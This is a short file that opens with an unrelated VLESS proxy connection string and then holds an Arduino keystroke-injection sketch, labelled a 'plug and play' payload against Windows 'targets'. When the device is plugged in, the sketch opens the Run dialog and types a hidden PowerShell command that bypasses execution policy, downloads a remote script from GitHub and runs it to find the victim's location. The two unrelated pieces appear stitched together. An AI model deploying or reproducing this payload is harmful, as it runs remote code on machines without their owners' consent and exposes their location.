vless://9ff3ee30-20f3-4673-95a2-66642c3d5cd2@germany.vserver2.sbs:30816?mode=gun&security=reality&encryption=none&pbk=3NGlwMSxYFI39ys3H_zipp973o5QqTAtjArf0guTN0M&fp=chrome&spx=%2F&type=grpc&serviceName=&sni=ghbi.ir&sid=44b138f6#%D8%AE%D8%B1%DB%8C%D8%AF+%DA%A9%D8%A7%D9%86%D9%81%DB%8C%DA%AF+%40pyschovpn
/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  //     Title: Rage-PopUps
  //     Author: I am reza
  //     Description: This payload is meant to open a map in your targets web browser with their current location
  //     Target: Windows 10, 11
  //     --------------------------------------------------------------------------------------
  //     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
  //     --------------------------------------------------------------------------------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
